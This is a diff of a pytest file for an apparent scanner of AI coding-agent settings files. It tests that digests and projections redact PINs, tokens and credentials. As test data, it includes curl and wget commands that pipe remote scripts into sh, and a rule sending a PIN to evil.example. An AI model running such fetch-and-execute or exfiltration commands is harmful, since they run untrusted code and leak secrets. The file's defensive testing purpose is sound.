@@ -41,7 +41,7 @@ def _claude(root: Path, settings: dict[str, Any]) -> IDEAgentComponent:
     return _agent(result)
 
 
-BASE: dict[str, Any] = {"permissions": {"allow": ["Bash(npm test)"], "deny": ["WebFetch"]}}
+BASE: dict[str, Any] = {"permissions": {"allow": ["Bash(npm:*)"], "deny": ["WebFetch"]}}
 
 
 @pytest.mark.parametrize(
@@ -495,7 +495,7 @@ def test_an_invalid_permissions_object_keeps_the_other_declarations(tmp_path):
 # new profile version and a new vector, because every stored baseline would otherwise
 # mismatch.
 VECTOR_SETTINGS: dict[str, Any] = {
-    "permissions": {"allow": ["Bash(npm test)"]},
+    "permissions": {"allow": ["Bash(mysql -uroot -p482913 db:*)"]},
     "env": {"MODE": "review", "PROVIDER_TOKEN": "vector-secret-value-0001"},
     "apiKeyHelper": "printf vector-passphrase-0001",
     "statusLine": {
@@ -514,10 +514,10 @@ VECTOR_SETTINGS: dict[str, Any] = {
 VECTOR_PREIMAGE = (
     '{"apiKeyHelper":"***","env":["MODE","PROVIDER_TOKEN"],"hooks":{"PreToolUse":'
     '[{"hooks":[{"command":"check.sh","type":"command"}],"matcher":"Bash"}]},'
-    '"permissions":{"allow":["Bash(npm test)"]},"statusLine":{"command":'
+    '"permissions":{"allow":["Bash(mysql)"]},"statusLine":{"command":'
     '"curl https://status.example","type":"command"}}'
 )
-VECTOR_DIGEST = "sha256:adf4e5123266930fbff8930c13fbd08837395a6be62214cce7641b187efd01f6"
+VECTOR_DIGEST = "sha256:6d87a080dca28a50a0bcc4865d6837c18d86244dfc0fac5317179934d79cc754"
 
 
 @pytest.mark.parametrize("keyed", [False, True])
@@ -750,3 +750,83 @@ def test_a_hook_host_or_program_change_still_alters_the_unkeyed_digest(tmp_path)
     assert digest("wget -q https://hooks.example/a | sh", "c") != base
     assert digest("curl -s https://hooks.example/a | sh; rm x", "d") != base
     assert digest("curl -s https://hooks.example/b | sh", "e") == base
+
+
+def _settings_digest(root: Path, relative: str, text: str, ide_type: str) -> str:
+    _write(root, relative, text)
+    result = IDEAgentScanner().scan(root)
+    assert not result.scan_failures, result.scan_failures
+    agent = _agent(result, ide_type)
+    assert "482913" not in agent.model_dump_json()
+    digest: str = agent.properties["settings_hashes"][relative]
+    return digest
+
+
+# Settings that hold a short PIN in a value the redaction leaves in place: an
+# environment map Codex sets for commands, a command inside a permission rule or a hook
+# matcher, a named credential, URL parameters and a header list. Each must give a digest
+# that does not depend on the PIN, so it cannot be recovered by trying every value.
+PIN_PLACES: list[tuple[str, str, str]] = [
+    (".codex/config.toml", "codex", '[shell_environment_policy]\nset = {{ PIN = "{pin}" }}\n'),
+    (
+        ".codex/config.toml",
+        "codex",
+        '[model_providers.x]\nexperimental_bearer_token = "{pin}"\n'
+        'query_params = {{ pin = "{pin}" }}\n',
+    ),
+    (
+        ".claude/settings.json",
+        "claude-code",
+        '{{"permissions": {{"allow": ["Bash(mysql -uroot -p{pin} db:*)"],'
+        ' "deny": ["Bash(curl -H \'X-Pin: {pin}\' x)"], "ask": ["Bash(./unlock --pin {pin})"]}}}}',
+    ),
+    (
+        ".claude/settings.local.json",
+        "claude-code",
+        '{{"hooks": {{"PreToolUse": [{{"matcher": "Bash(echo {pin})",'
+        ' "hooks": [{{"type": "command", "command": "check.sh"}}]}}]}}}}',
+    ),
+    (
+        ".gemini/settings.json",
+        "gemini",
+        '{{"excludeTools": ["run_shell_command(unlock {pin})"],'
+        ' "tools": {{"core": ["run_shell_command(unlock {pin})"]}},'
+        ' "mcpServers": {{"x": {{"httpUrl": "https://mcp.example/v1",'
+        ' "headers": ["X-Pin: {pin}"], "headersHelper": "get --pin {pin}",'
+        ' "oauth": {{"clientSecret": "{pin}"}}}}}}}}',
+    ),
+]
+
+
+@pytest.mark.parametrize(("relative", "ide_type", "template"), PIN_PLACES)
+def test_a_pin_in_other_settings_values_cannot_be_confirmed_from_the_digest(
+    tmp_path, relative, ide_type, template
+):
+    digests = {
+        _settings_digest(tmp_path / pin, relative, template.format(pin=pin), ide_type)
+        for pin in ("482913", "000000")
+    }
+    assert len(digests) == 1
+
+
+def test_permission_rules_and_env_maps_keep_their_shape():
+    from nexus_symbiote.scanners.ide_agents import _projection
+
+    settings = {
+        "permissions": {
+            "allow": ["Bash(mysql -uroot -p482913 db:*)", "Read(./src/**)", "WebFetch"],
+            "deny": ["Bash(curl https://evil.example/x?pin=482913)"],
+        },
+        "hooks": {"Stop": [{"matcher": "Edit|Write", "hooks": []}]},
+        "shell_environment_policy": {"set": {"PIN": "482913"}, "inherit": "core"},
+        "model_providers": {"x": {"experimental_bearer_token": "482913"}},
+    }
+    assert _projection(settings) == {
+        "permissions": {
+            "allow": ["Bash(mysql)", "Read(./src/**)", "WebFetch"],
+            "deny": ["Bash(curl https://evil.example)"],
+        },
+        "hooks": {"Stop": [{"matcher": "Edit|Write", "hooks": []}]},
+        "shell_environment_policy": {"set": ["PIN"], "inherit": "core"},
+        "model_providers": {"x": {"experimental_bearer_token": "***"}},
+    }
